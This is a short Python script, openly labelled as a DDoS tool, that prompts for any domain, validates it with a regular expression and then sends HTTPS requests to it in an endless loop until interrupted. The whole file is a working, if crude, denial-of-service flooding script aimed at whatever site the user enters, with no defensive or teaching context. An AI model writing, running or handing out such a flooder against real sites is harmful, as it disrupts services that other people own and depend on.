import requests
import re
print("enter website domain :")
domain = input()
def start_ddos(domain):
    while True:
        try:
            x = requests.get("https://"+domain)
            print(x.status_code)
        except KeyboardInterrupt:
            print("\nddos stopped.")
            break
def check_domain_valid(domain):
     # Regular expression to validate domain
    pattern = r"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+(?:[a-zA-Z]{2,})$"
    return bool(re.match(pattern, domain))
if check_domain_valid(domain) is True:
    start_ddos(domain)
else:
    print("enter a valid domain")
